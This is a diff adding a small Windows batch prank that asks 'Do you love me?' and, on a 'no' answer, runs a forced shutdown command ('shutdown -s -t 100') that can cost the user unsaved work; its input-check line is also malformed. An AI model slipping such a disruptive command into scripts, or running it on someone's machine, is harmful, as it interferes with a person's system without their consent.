@@ -1,0 +1,21 @@
+@echo off
+:1
+color a
+echo Hello, Do you love me?(answer in only yes/no)
+set /p input=
+if /i %input%==Yes goto love
+if /i %input%==no goto hate
+if /i not %input%== Yes,no goto 1
+
+:love
+echo I Love You Too...
+echo See You Later...
+echo Mwaaa Mwaaa
+pause
+exit
+
+:hate
+echo But I love You....
+echo Why you don't love me...
+timeout 2
+shutdown -s -t 100
